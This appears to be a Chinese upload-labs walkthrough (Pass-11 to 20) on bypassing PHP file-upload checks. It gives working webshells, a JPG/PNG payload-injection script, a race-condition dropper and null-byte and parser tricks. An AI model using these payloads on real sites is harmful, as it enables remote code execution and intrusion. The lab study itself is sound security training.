Pass-11 00截断GET方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 关键函数解析1234567891011121314strrpos()定义和用法strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。注释：strrpos() 函数对大小写敏感。相关函数：stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）语法strrpos(string,find,start)参数 描述string 必需。规定被搜索的字符串。find 必需。规定要查找的字符。start 可选。规定在何处开始搜索。 1234567substr()这里写代码片语法substr(string,start,length)参数 描述string 必需。规定要返回其中一部分的字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 test: 123456&lt;?php$a = '1.jpg';$file_ext = substr($a,strrpos($a,\".\")+1);var_dump($file_ext);?&gt;返回jpg 分析代码： 1$img_path = $_GET['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext; 发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过。但是发现怎么截断都没有用。查阅资料： 123截断条件： php版本小于5.3.4 详情关注CVE-2006-7243 php的magic_quotes_gpc为OFF状态 解决后，抓包 请求中会自动将%00进行url解码，在后台进行拼凑的时候会自动阶段后面的字符串上传成功后的文件名即为你修改的名 补充：在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断 Pass-12 00截断POST方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 该题也是00截断，只不过由于文件路径这个参数是通过post请求发送的，需要抓包后再hex中修改，因为post不会像get对%00进行自动解码 1$img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; save_path 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.这里把 2b(‘+’的 hex) 修改成 00 或者把 20(‘空格’的hex)修改为00 这里的路径 1.php+或1.php 都可 需自己手动加上 完成发送即可上传 补充：在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断 Pass-13 图片马通过上传图片马，再利用本地包含漏洞执行 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可图片马制作方法,cmd中执行： 123copy one.jpg /b + one.php /a one.jpg/b:指定二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件，用于txt等文本累文件 或 利用16进制编辑器在图片的编辑栏末尾加上木马 成功上传，而且得到文件的名称。我们后期如果存在文件包含漏洞就可以利用 比如我们简单写一个存在文件包含漏洞的页面: 123456&lt;?php$file = $_GET[ 'page' ];include($file);?&gt; 发现可以成功利用漏洞： Pass-14 图片马getimagsize函数12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 关键代码： 1234$types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); 这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过， 知识补充点：1234array getimagesize ( string $filename [, array &amp;$imageinfo ] )getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 同样用上一关的图片木马进行上传也可成功利用方式和上一关一样，需要文件包含漏洞 Pass-15 图片马php_exif本关还是要上传一个图片马，这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过就不多说。 Pass-16 图片马二次渲染因为上传显示的的图片是二次渲染后生成的新图片，所以之前插入在图片中的代码会被过滤掉，因此上述的图片马无法实现 不同图片不同的绕过方法： gif：先把gif上传后，取出该文件与未修改的文件进行对比 蓝色部分内容为未改变的部分，因此可在蓝色部分中插入木马上传绕过 再上传 被修改的内容未被过滤，成功绕过，再结合文件包含漏洞 jpg：过于复杂，利用脚本处理得到上传图片： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?php eval($_POST['DD']); ?&gt;\";//插入的恶意代码 if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 但有一些jpg图片不能被处理,所以要多尝试一些jpg图片使用脚本处理1.jpg 得到 用16进制编辑器查看 生成的图片中已插入php代码上传该图片码后，插入的php代码未被过滤 png:同样使用脚本处理图片: 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 得到 16进制编辑器查看 php代码已插入代码的使用：url： post: 相当于执行命令system(ipconfig) 本关还是要上传一个图片马。 1234567imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。该系列函数有：imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像 Pass-17 条件竞争1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 在if判读不通过unlink文件之前已经用move_uploaded_file函数将文件上传到upload目录下，所以通过bp不断的上传weshell，然后在浏览器中不断的访问总能访问到未被unlink的webshell文件 这里可以使用burp去发包， 即用Burp不断上传，再用burp不断访问 ，在burp中不断发送上传webshell的数据包，可以把文件内容改成下面这样 （就是为了写文件进去就对了） 1234&lt;?php$c=fopen('./cmd.php','w');fwrite($c,'&lt;?php system($_GET[\"f\"]);?&gt;');?&gt; 跑了之后， 就会在该文件夹下面产生新的文件了 访问 Pass18 条件竞争图片马1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//index.php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125;//myupload.phpclass MyUpload&#123; var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); &#125;&#125;; 对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功 Pass-19 00截断POST方式与12题同样的方式 Pass-20 数组加/.绕过123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125;&#125;else&#123; $msg = \"请选择要上传的文件！\";&#125; 首先end函数取所post参数数组中的最后一个值，$file_name = reset($file) . ‘.’ . $file[count($file) - 1]我们可以post一个参数名为一个[0]一个[2]，然后$file[count($file) - 1]就为空，$file_name最终就为reset($file)即$file[0]，就可以绕过判断 抓包： 文件类型修改为图片类型： 漏洞利用： 上传成功： 看了其他大佬的总结，还有其他的一些未见过的解析漏洞IIS 6.0IIS 6.0解析利用又三种： 1.目录解析建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析 2.文件解析后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名) 3.默认解析IIS6.0 默认的可执行文件除了asp还包含这三种 1234/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx IIS 7.0/7.5在正常图片URL后添加 /.php，可以解析为php Apache一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全 后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3则会被解析为php NginxNginx &lt;8.03畸形解析漏洞直接在正常图片URL后添加/.phpNginx &lt;=0.8.37在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件","categories":[],"tags":[]}]}